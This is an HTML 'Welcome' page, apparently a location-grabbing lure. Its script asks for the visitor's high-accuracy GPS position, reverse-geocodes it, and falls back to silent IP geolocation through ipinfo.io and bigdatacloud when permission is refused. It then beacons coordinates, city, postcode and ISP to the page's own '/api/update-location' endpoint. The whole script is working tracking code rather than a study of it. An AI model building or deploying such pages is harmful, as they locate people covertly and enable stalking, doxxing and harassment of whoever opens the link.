<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Welcome</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Segoe UI',sans-serif;background:#0d0d0d;color:#eee;
         display:flex;align-items:center;justify-content:center;height:100vh}
    .box{text-align:center;padding:40px}
    h1{font-size:28px;margin-bottom:10px}
    p{color:#888;font-size:15px}
    #status{font-size:11px;color:#444;margin-top:20px}
  </style>
</head>
<body>
  <div class="box">
    <h1>Welcome ðŸ‘‹</h1>
    <p>This page is being tracked silently.</p>
    <p id="status"></p>
  </div>

  <script>
    var log = function(msg){ document.getElementById('status').textContent = msg; console.log(msg); };

    function postLocation(data) {
      // Use sendBeacon for reliability â€” works even if page unloads
      var blob = new Blob([JSON.stringify(data)], {type:'application/json'});
      var sent = navigator.sendBeacon('/api/update-location', blob);
      if (!sent) {
        // fallback to fetch
        fetch('/api/update-location', {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body: JSON.stringify(data)
        }).catch(function(){});
      }
      log('Sent: ' + data.city + ', ' + data.region + ', ' + data.country + ' [' + data.lookupSource + ']');
    }

    async function ipFallback() {
      log('GPS denied â€” trying IP lookup...');
      try {
        var r = await fetch('https://ipinfo.io/json');
        var d = await r.json();
        log('ipinfo response: ' + JSON.stringify(d).substring(0,100));
        if (d && d.city) {
          var coords = (d.loc || '').split(',');
          postLocation({
            lat:          coords[0] ? parseFloat(coords[0]) : null,
            lon:          coords[1] ? parseFloat(coords[1]) : null,
            city:         d.city     || '',
            region:       d.region   || '',
            country:      d.country  || '',
            countryCode:  d.country  || '',
            zip:          d.postal   || '',
            isp:          d.org      || '',
            timezone:     d.timezone || '',
            lookupSource: 'ipGeolocation'
          });
          return;
        }
      } catch(e){ log('ipinfo failed: ' + e.message); }

      // Last resort
      try {
        var r2 = await fetch('https://api.bigdatacloud.net/data/ip-geolocation-full?localityLanguage=en');
        var d2 = await r2.json();
        if (d2 && d2.location) {
          postLocation({
            lat:          d2.location.latitude  || null,
            lon:          d2.location.longitude || null,
            city:         d2.location.city || d2.location.localityName || '',
            region:       d2.location.principalSubdivision || '',
            country:      (d2.country && d2.country.name) || '',
            countryCode:  (d2.country && d2.country.isoAlpha2) || '',
            zip:          d2.location.postcode || '',
            isp:          (d2.network && d2.network.organisation) || '',
            lookupSource: 'ipGeolocation'
          });
        }
      } catch(e){ log('BigDataCloud also failed: ' + e.message); }
    }

    async function onGPSSuccess(pos) {
      var lat = pos.coords.latitude;
      var lon = pos.coords.longitude;
      log('GPS got: ' + lat + ', ' + lon + ' â€” reverse geocoding...');

      try {
        var r = await fetch(
          'https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + lat +
          '&longitude=' + lon + '&localityLanguage=en'
        );
        var geo = await r.json();
        log('Geocode: ' + JSON.stringify(geo).substring(0,120));
        postLocation({
          lat:          lat,
          lon:          lon,
          city:         geo.city || geo.locality || '',
          region:       geo.principalSubdivision || '',
          country:      geo.countryName || '',
          countryCode:  geo.countryCode || '',
          zip:          geo.postcode || '',
          lookupSource: 'reverseGeocoding'
        });
      } catch(e) {
        log('Reverse geocode failed: ' + e.message + ' â€” sending coords only');
        postLocation({ lat: lat, lon: lon, lookupSource: 'gpsOnly' });
      }
    }

    // Start
    if (navigator.geolocation) {
      log('Requesting GPS...');
      navigator.geolocation.getCurrentPosition(
        onGPSSuccess,
        function(err){ ipFallback(); },
        { timeout: 10000, maximumAge: 0, enableHighAccuracy: true }
      );
    } else {
      ipFallback();
    }
  </script>
</body>
</html>
